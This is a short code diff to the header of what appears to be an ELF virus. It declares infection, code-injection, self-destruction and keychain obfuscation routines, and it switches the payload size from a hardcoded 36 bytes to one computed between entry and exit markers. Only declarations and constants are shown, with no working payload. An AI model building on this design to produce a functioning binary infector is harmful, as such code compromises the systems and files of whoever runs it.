@@ -33,11 +33,7 @@
 #define LEFT 0
 #define RIGHT 1
 
-//#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
-#define PAYLOAD_SIZE 36
-
-#define JMP_OFFSET 66
-#define JMP_OPCODE 0xe9
+#define PAYLOAD_SIZE (size_t)((void *)out - (void *)__entry)
 
 #define STACK_SIZE 1024 * 64
 
@@ -96,7 +92,7 @@ struct s_host
 	Elf64_Addr old_entry;
 	Elf64_Addr new_entry;
 
-	void *stack;
+	void *rsp;
 };
 
 struct s_keychain
@@ -110,6 +106,8 @@ struct s_keychain
 /// DECLARATIONS 
 ////////////////////////////////////////////////////////////////////////////////
 
+void out(void);
+
 // LINEAR FLOW 
 void __entry(void);
 
@@ -122,7 +120,7 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 
-void __exit(void *stack);
+void __exit(const struct s_host *host, struct s_keychain *keychain);
 
 // STUB (OBFUSCATION)
 __attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
